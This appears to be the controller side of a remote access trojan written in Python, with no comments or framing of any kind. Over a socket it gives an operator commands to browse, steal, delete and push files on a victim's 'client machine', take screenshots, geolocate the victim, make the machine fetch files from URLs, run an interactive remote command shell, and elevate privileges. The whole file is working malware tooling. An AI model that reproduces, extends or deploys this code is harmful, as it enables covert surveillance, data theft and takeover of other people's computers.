import os
import socket
import base64
import random
import datetime
import time


def check_command(conn,command):
    if command == "pwd":
        pwd(conn,command)

    if command == "custom_dir":
        custom_dir(conn,command)

    if command == "download_file":
        download_file(conn,command)

    if command == "remove_file":
        remove_file(conn,command)

    if command == "send_file":
        send_file(conn,command)

    if command == "screenshot":
        screenshot(conn,command)

    if command == "geolocate":
        geolocate(conn,command)

    if command == "download_url":
        download_url(conn,command)

    if command == "cmd":
        cmd(conn,command)                

    if command == "help":
        get_help()
    
    if command == "get_admin":
        get_admin(conn,command)

def pwd(conn,command):
    conn.send(command.encode())
    print("[+] Command has been sent. Waiting for execution...")
    files = conn.recv(5000) #bytes
    files = files.decode()
    print("[+] Command output: ", files)

def custom_dir(conn,command):
    conn.send(command.encode())
    user_input = str(input("Custom directory: "))
    conn.send(user_input.encode())
    print("[+] Command has been sent")
    files = conn.recv(5000)
    files = files.decode()
    print("[+] Directory:\n", files)

def download_file(conn,command):
    conn.send(command.encode())
    filepath = str(input("Please enter filepath to the file on the client machine: "))
    conn.send(filepath.encode())
    file = conn.recv(10000)
    filename = str(input("Please enter a filename for the file you want to download: "))
    newfile = open(filename, "wb")
    newfile.write(file)
    newfile.close()
    print(filename, " has been downloaded and saved")

def remove_file(conn,command):
    conn.send(command.encode())
    file_and_dir = str(input("Please enter filepath to the file you want to delete on the client machine: "))
    conn.send(file_and_dir.encode())
    print("[+] ", file_and_dir, " has been deleted successfully...")

def send_file(conn,command):
    conn.send(command.encode())
    file = str(input("Please enter path to the file you want to send: "))
    filename = str(input("Please enter filename for the file on the client machine: "))
    data = open(file, "rb")
    file_data = data.read(70000000)
    conn.send(file.encode())
    print(file, "has been sent successfully")
    conn.send(file_data)

def screenshot(conn,command):
    conn.send(command.encode())
    print("Taking screenshot of client")
    screenshot_data = conn.recv(1000000)
    time = datetime.datetime.now()
    screenshot_name = "Screenshot" + time.strftime("%y-%m-%H-%M-%S") + ".png"
    screenshot_file = open(screenshot_name, "wb+")
    screenshot_file.write(screenshot_data)
    screenshot_file.close()
    print("Image path: ", os.path.abspath(screenshot_name))

def geolocate(conn,command):
    conn.send(command.encode())
    geolocation = conn.recv(5000)
    geolocation = geolocation.decode()
    geolocation_coordinates = conn.recv(5000)
    geolocation_coordinates = geolocation_coordinates.decode()
    print("[*] Note: This may not be accurate (https://whatismyipaddress.com/geolocation-accuracy)")
    print(geolocation_coordinates)
    print(geolocation)

def download_url(conn,command):
    conn.send(command.encode())
    url = str(input("Download URL: "))
    conn.send(url.encode())
    filename = str(input("Filename: "))
    conn.send(filename.encode())
    print("[+] Downloading file")

def cmd(conn,command): # Interact with the command prompt
    conn.send(command.encode())
    while True:
        cmd_command = input()
        if cmd_command == 'quit':
            break
        if len(str.encode(cmd_command)) > 0:
            conn.send(str.encode(cmd_command))
            client_response = str(conn.recv(13107200).decode())

            client_response = client_response.replace('Den angivne sti blev ikke fundet.', "") # Gets rid of false errors
            print(client_response, end="")

def get_admin(conn,command):
    conn.send(command.encode())
    
def get_help():
    print("")
    print("List of commands")
    print("")
    print("pwd           -      Print Working Directory")
    print("custom_dir    -      Custom Directory       ")
    print("download_file -      Download File          ")
    print("remove_file   -      Delete File            ")
    print("send_file -   -      Send File              ")
    print("")
    print("geolocate     -      Geolocate              ")
    print("screenshot    -      Screenshot             ")
    print("cmd           -      CMD                    ")
    print("get_admin     -      Elevate Privileges     ")
    print("help     -           Get Help     ")
    print("")